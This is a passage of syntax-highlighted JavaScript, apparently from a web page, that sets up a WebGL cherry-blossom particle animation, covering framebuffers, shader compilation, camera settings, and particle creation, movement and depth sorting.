class="line"><span class="javascript">            <span class="string">&#x27;height&#x27;</span>:h,</span></span><br><span class="line"><span class="javascript">            <span class="string">&#x27;sizeArray&#x27;</span>:<span class="keyword">new</span> <span class="built_in">Float32Array</span>([w, h, w / h]),</span></span><br><span class="line"><span class="javascript">            <span class="string">&#x27;dtxArray&#x27;</span>:<span class="keyword">new</span> <span class="built_in">Float32Array</span>([<span class="number">1.0</span> / w, <span class="number">1.0</span> / h])</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">        ret.frameBuffer = gl.createFramebuffer();</span></span><br><span class="line"><span class="javascript">        ret.renderBuffer = gl.createRenderbuffer();</span></span><br><span class="line"><span class="javascript">        ret.texture = gl.createTexture();</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.bindTexture(gl.TEXTURE_2D, ret.texture);</span></span><br><span class="line"><span class="javascript">        gl.texImage2D(gl.TEXTURE_2D, <span class="number">0</span>, gl.RGBA, w, h, <span class="number">0</span>, gl.RGBA, gl.UNSIGNED_BYTE, <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript">        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);</span></span><br><span class="line"><span class="javascript">        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);</span></span><br><span class="line"><span class="javascript">        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);</span></span><br><span class="line"><span class="javascript">        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.bindFramebuffer(gl.FRAMEBUFFER, ret.frameBuffer);</span></span><br><span class="line"><span class="javascript">        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, ret.texture, <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.bindRenderbuffer(gl.RENDERBUFFER, ret.renderBuffer);</span></span><br><span class="line"><span class="javascript">        gl.renderbufferStorage(gl.RENDERBUFFER, gl.DEPTH_COMPONENT16, w, h);</span></span><br><span class="line"><span class="javascript">        gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.DEPTH_ATTACHMENT, gl.RENDERBUFFER, ret.renderBuffer);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.bindTexture(gl.TEXTURE_2D, <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript">        gl.bindRenderbuffer(gl.RENDERBUFFER, <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript">        gl.bindFramebuffer(gl.FRAMEBUFFER, <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> ret;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">compileShader</span>(<span class="params">shtype, shsrc</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> retsh = gl.createShader(shtype);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.shaderSource(retsh, shsrc);</span></span><br><span class="line"><span class="javascript">        gl.compileShader(retsh);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(!gl.getShaderParameter(retsh, gl.COMPILE_STATUS)) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> errlog = gl.getShaderInfoLog(retsh);</span></span><br><span class="line"><span class="javascript">            gl.deleteShader(retsh);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.error(errlog);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">null</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> retsh;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">createShader</span>(<span class="params">vtxsrc, frgsrc, uniformlist, attrlist</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> vsh = compileShader(gl.VERTEX_SHADER, vtxsrc);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> fsh = compileShader(gl.FRAGMENT_SHADER, frgsrc);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(vsh == <span class="literal">null</span> || fsh == <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">null</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> prog = gl.createProgram();</span></span><br><span class="line"><span class="javascript">        gl.attachShader(prog, vsh);</span></span><br><span class="line"><span class="javascript">        gl.attachShader(prog, fsh);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.deleteShader(vsh);</span></span><br><span class="line"><span class="javascript">        gl.deleteShader(fsh);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        gl.linkProgram(prog);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (!gl.getProgramParameter(prog, gl.LINK_STATUS)) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> errlog = gl.getProgramInfoLog(prog);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.error(errlog);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">null</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(uniformlist) &#123;</span></span><br><span class="line"><span class="javascript">            prog.uniforms = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; uniformlist.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                prog.uniforms[uniformlist[i]] = gl.getUniformLocation(prog, uniformlist[i]);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(attrlist) &#123;</span></span><br><span class="line"><span class="javascript">            prog.attributes = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; attrlist.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> attr = attrlist[i];</span></span><br><span class="line"><span class="javascript">                prog.attributes[attr] = gl.getAttribLocation(prog, attr);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> prog;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">useShader</span>(<span class="params">prog</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        gl.useProgram(prog);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> attr <span class="keyword">in</span> prog.attributes) &#123;</span></span><br><span class="line"><span class="javascript">            gl.enableVertexAttribArray(prog.attributes[attr]);;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">unuseShader</span>(<span class="params">prog</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> attr <span class="keyword">in</span> prog.attributes) &#123;</span></span><br><span class="line"><span class="javascript">            gl.disableVertexAttribArray(prog.attributes[attr]);;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        gl.useProgram(<span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">/////</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> projection = &#123;</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;angle&#x27;</span>:<span class="number">60</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;nearfar&#x27;</span>:<span class="keyword">new</span> <span class="built_in">Float32Array</span>([<span class="number">0.1</span>, <span class="number">100.0</span>]),</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;matrix&#x27;</span>:Matrix44.createIdentity()</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> camera = &#123;</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;position&#x27;</span>:Vector3.create(<span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>),</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;lookat&#x27;</span>:Vector3.create(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>),</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;up&#x27;</span>:Vector3.create(<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;dof&#x27;</span>:Vector3.create(<span class="number">10.0</span>, <span class="number">4.0</span>, <span class="number">8.0</span>),</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;matrix&#x27;</span>:Matrix44.createIdentity()</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> pointFlower = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> meshFlower = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> sceneStandBy = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> BlossomParticle = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.velocity = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.rotation = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.position = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.euler = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.size = <span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.alpha = <span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.zkey = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    BlossomParticle.prototype.setVelocity = <span class="function"><span class="keyword">function</span> (<span class="params">vx, vy, vz</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.velocity[<span class="number">0</span>] = vx;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.velocity[<span class="number">1</span>] = vy;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.velocity[<span class="number">2</span>] = vz;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    BlossomParticle.prototype.setRotation = <span class="function"><span class="keyword">function</span> (<span class="params">rx, ry, rz</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.rotation[<span class="number">0</span>] = rx;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.rotation[<span class="number">1</span>] = ry;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.rotation[<span class="number">2</span>] = rz;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    BlossomParticle.prototype.setPosition = <span class="function"><span class="keyword">function</span> (<span class="params">nx, ny, nz</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.position[<span class="number">0</span>] = nx;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.position[<span class="number">1</span>] = ny;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.position[<span class="number">2</span>] = nz;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    BlossomParticle.prototype.setEulerAngles = <span class="function"><span class="keyword">function</span> (<span class="params">rx, ry, rz</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.euler[<span class="number">0</span>] = rx;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.euler[<span class="number">1</span>] = ry;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.euler[<span class="number">2</span>] = rz;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    BlossomParticle.prototype.setSize = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.size = s;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    BlossomParticle.prototype.update = <span class="function"><span class="keyword">function</span> (<span class="params">dt, et</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.position[<span class="number">0</span>] += <span class="built_in">this</span>.velocity[<span class="number">0</span>] * dt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.position[<span class="number">1</span>] += <span class="built_in">this</span>.velocity[<span class="number">1</span>] * dt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.position[<span class="number">2</span>] += <span class="built_in">this</span>.velocity[<span class="number">2</span>] * dt;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.euler[<span class="number">0</span>] += <span class="built_in">this</span>.rotation[<span class="number">0</span>] * dt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.euler[<span class="number">1</span>] += <span class="built_in">this</span>.rotation[<span class="number">1</span>] * dt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.euler[<span class="number">2</span>] += <span class="built_in">this</span>.rotation[<span class="number">2</span>] * dt;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">createPointFlowers</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// get point sizes</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> prm = gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE);</span></span><br><span class="line"><span class="javascript">        renderSpec.pointSize = &#123;<span class="string">&#x27;min&#x27;</span>:prm[<span class="number">0</span>], <span class="string">&#x27;max&#x27;</span>:prm[<span class="number">1</span>]&#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> vtxsrc = <span class="built_in">document</span>.getElementById(<span class="string">&quot;sakura_point_vsh&quot;</span>).textContent;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> frgsrc = <span class="built_in">document</span>.getElementById(<span class="string">&quot;sakura_point_fsh&quot;</span>).textContent;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        pointFlower.program = createShader(</span></span><br><span class="line"><span class="javascript">            vtxsrc, frgsrc,</span></span><br><span class="line"><span class="javascript">            [<span class="string">&#x27;uProjection&#x27;</span>, <span class="string">&#x27;uModelview&#x27;</span>, <span class="string">&#x27;uResolution&#x27;</span>, <span class="string">&#x27;uOffset&#x27;</span>, <span class="string">&#x27;uDOF&#x27;</span>, <span class="string">&#x27;uFade&#x27;</span>],</span></span><br><span class="line"><span class="javascript">            [<span class="string">&#x27;aPosition&#x27;</span>, <span class="string">&#x27;aEuler&#x27;</span>, <span class="string">&#x27;aMisc&#x27;</span>]</span></span><br><span class="line"><span class="javascript">        );</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        useShader(pointFlower.program);</span></span><br><span class="line"><span class="javascript">        pointFlower.offset = <span class="keyword">new</span> <span class="built_in">Float32Array</span>([<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>]);</span></span><br><span class="line"><span class="javascript">        pointFlower.fader = Vector3.create(<span class="number">0.0</span>, <span class="number">10.0</span>, <span class="number">0.0</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// paramerters: velocity[3], rotate[3]</span></span></span><br><span class="line"><span class="javascript">        pointFlower.numFlowers = <span class="number">1600</span>;</span></span><br><span class="line"><span class="javascript">        pointFlower.particles = <span class="keyword">new</span> <span class="built_in">Array</span>(pointFlower.numFlowers);</span></span><br><span class="line"><span class="javascript">        <span class="comment">// vertex attributes &#123;position[3], euler_xyz[3], size[1]&#125;</span></span></span><br><span class="line"><span class="javascript">        pointFlower.dataArray = <span class="keyword">new</span> <span class="built_in">Float32Array</span>(pointFlower.numFlowers * (<span class="number">3</span> + <span class="number">3</span> + <span class="number">2</span>));</span></span><br><span class="line"><span class="javascript">        pointFlower.positionArrayOffset = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        pointFlower.eulerArrayOffset = pointFlower.numFlowers * <span class="number">3</span>;</span></span><br><span class="line"><span class="javascript">        pointFlower.miscArrayOffset = pointFlower.numFlowers * <span class="number">6</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        pointFlower.buffer = gl.createBuffer();</span></span><br><span class="line"><span class="javascript">        gl.bindBuffer(gl.ARRAY_BUFFER, pointFlower.buffer);</span></span><br><span class="line"><span class="javascript">        gl.bufferData(gl.ARRAY_BUFFER, pointFlower.dataArray, gl.DYNAMIC_DRAW);</span></span><br><span class="line"><span class="javascript">        gl.bindBuffer(gl.ARRAY_BUFFER, <span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        unuseShader(pointFlower.program);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; pointFlower.numFlowers; i++) &#123;</span></span><br><span class="line"><span class="javascript">            pointFlower.particles[i] = <span class="keyword">new</span> BlossomParticle();</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">initPointFlowers</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//area</span></span></span><br><span class="line"><span class="javascript">        pointFlower.area = Vector3.create(<span class="number">20.0</span>, <span class="number">20.0</span>, <span class="number">20.0</span>);</span></span><br><span class="line"><span class="javascript">        pointFlower.area.x = pointFlower.area.y * renderSpec.aspect;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        pointFlower.fader.x = <span class="number">10.0</span>; <span class="comment">//env fade start</span></span></span><br><span class="line"><span class="javascript">        pointFlower.fader.y = pointFlower.area.z; <span class="comment">//env fade half</span></span></span><br><span class="line"><span class="javascript">        pointFlower.fader.z = <span class="number">0.1</span>;  <span class="comment">//near fade start</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//particles</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> PI2 = <span class="built_in">Math</span>.PI * <span class="number">2.0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> tmpv3 = Vector3.create(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> tmpv = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> symmetryrand = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="keyword">return</span> (<span class="built_in">Math</span>.random() * <span class="number">2.0</span> - <span class="number">1.0</span>);&#125;;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; pointFlower.numFlowers; i++) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> tmpprtcl = pointFlower.particles[i];</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="comment">//velocity</span></span></span><br><span class="line"><span class="javascript">            tmpv3.x = symmetryrand() * <span class="number">0.3</span> + <span class="number">0.8</span>;</span></span><br><span class="line"><span class="javascript">            tmpv3.y = symmetryrand() * <span class="number">0.2</span> - <span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">            tmpv3.z = symmetryrand() * <span class="number">0.3</span> + <span class="number">0.5</span>;</span></span><br><span class="line"><span class="javascript">            Vector3.normalize(tmpv3);</span></span><br><span class="line"><span class="javascript">            tmpv = <span class="number">2.0</span> + <span class="built_in">Math</span>.random() * <span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">            tmpprtcl.setVelocity(tmpv3.x * tmpv, tmpv3.y * tmpv, tmpv3.z * tmpv);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="comment">//rotation</span></span></span><br><span class="line"><span class="javascript">            tmpprtcl.setRotation(</span></span><br><span class="line"><span class="javascript">                symmetryrand() * PI2 * <span class="number">0.5</span>,</span></span><br><span class="line"><span class="javascript">                symmetryrand() * PI2 * <span class="number">0.5</span>,</span></span><br><span class="line"><span class="javascript">                symmetryrand() * PI2 * <span class="number">0.5</span></span></span><br><span class="line"><span class="javascript">            );</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="comment">//position</span></span></span><br><span class="line"><span class="javascript">            tmpprtcl.setPosition(</span></span><br><span class="line"><span class="javascript">                symmetryrand() * pointFlower.area.x,</span></span><br><span class="line"><span class="javascript">                symmetryrand() * pointFlower.area.y,</span></span><br><span class="line"><span class="javascript">                symmetryrand() * pointFlower.area.z</span></span><br><span class="line"><span class="javascript">            );</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="comment">//euler</span></span></span><br><span class="line"><span class="javascript">            tmpprtcl.setEulerAngles(</span></span><br><span class="line"><span class="javascript">                <span class="built_in">Math</span>.random() * <span class="built_in">Math</span>.PI * <span class="number">2.0</span>,</span></span><br><span class="line"><span class="javascript">                <span class="built_in">Math</span>.random() * <span class="built_in">Math</span>.PI * <span class="number">2.0</span>,</span></span><br><span class="line"><span class="javascript">                <span class="built_in">Math</span>.random() * <span class="built_in">Math</span>.PI * <span class="number">2.0</span></span></span><br><span class="line"><span class="javascript">            );</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="comment">//size</span></span></span><br><span class="line"><span class="javascript">            tmpprtcl.setSize(<span class="number">0.9</span> + <span class="built_in">Math</span>.random() * <span class="number">0.1</span>);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">renderPointFlowers</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//update</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> PI2 = <span class="built_in">Math</span>.PI * <span class="number">2.0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> limit = [pointFlower.area.x, pointFlower.area.y, pointFlower.area.z];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> repeatPos = <span class="function"><span class="keyword">function</span> (<span class="params">prt, cmp, limit</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(<span class="built_in">Math</span>.abs(prt.position[cmp]) - prt.size * <span class="number">0.5</span> &gt; limit) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">//out of area</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(prt.position[cmp] &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    prt.position[cmp] -= limit * <span class="number">2.0</span>;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                    prt.position[cmp] += limit * <span class="number">2.0</span>;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> repeatEuler = <span class="function"><span class="keyword">function</span> (<span class="params">prt, cmp</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            prt.euler[cmp] = prt.euler[cmp] % PI2;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(prt.euler[cmp] &lt; <span class="number">0.0</span>) &#123;</span></span><br><span class="line"><span class="javascript">                prt.euler[cmp] += PI2;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; pointFlower.numFlowers; i++) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> prtcl = pointFlower.particles[i];</span></span><br><span class="line"><span class="javascript">            prtcl.update(timeInfo.delta, timeInfo.elapsed);</span></span><br><span class="line"><span class="javascript">            repeatPos(prtcl, <span class="number">0</span>, pointFlower.area.x);</span></span><br><span class="line"><span class="javascript">            repeatPos(prtcl, <span class="number">1</span>, pointFlower.area.y);</span></span><br><span class="line"><span class="javascript">            repeatPos(prtcl, <span class="number">2</span>, pointFlower.area.z);</span></span><br><span class="line"><span class="javascript">            repeatEuler(prtcl, <span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">            repeatEuler(prtcl, <span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">            repeatEuler(prtcl, <span class="number">2</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            prtcl.alpha = <span class="number">1.0</span>;<span class="comment">//(pointFlower.area.z - prtcl.position[2]) * 0.5;</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">            prtcl.zkey = (camera.matrix[<span class="number">2</span>] * prtcl.position[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript">                + camera.matrix[<span class="number">6</span>] * prtcl.position[<span class="number">1</span>]</span></span><br><span class="line"><span class="javascript">                + camera.matrix[<span class="number">10</span>] * prtcl.position[<span class="number">2</span>]</span></span><br><span class="line"><span class="javascript">                + camera.matrix[<span class="number">14</span>]);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// sort</span></span></span><br><span class="line"><span class="javascript">        pointFlower.particles.sort(<span class="function"><span class="keyword">function</span>(<span class="params">p0, p1</span>)</span>&#123;<span class="keyword">return</span> p0.zkey - p1.zkey;&#125;);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// update data</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ipos = pointFlower.positionArrayOffset;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ieuler = pointFlower.eulerArrayOffset;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> imisc = pointFlower.miscArrayOffset;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; pointFlower.numFlowers; i++) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> prtcl = pointFlower.particles[i];</span></span><br><span class="line"><span class="javascript">            pointFlower.dataArray[ipos] = prtcl.position[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">            pointFlower.dataArray[ipos + <span class="number">1</span>] = prtcl.position[<span class="number">1</span>];</span></span><br><span class="line"><span class="javascript">            pointFlower.dataArray[ipos + <span class="number">2</span>] = prtcl.position[<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript">            ipos += <span class="number">3</span>;</span></span><br><span class="line"><span class="javascript">            pointFlower.dataArray[ieuler] = prtcl.euler[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">            pointFlower.dataArray[ieuler + <span class="number">1</span>] = prtcl.euler[<span 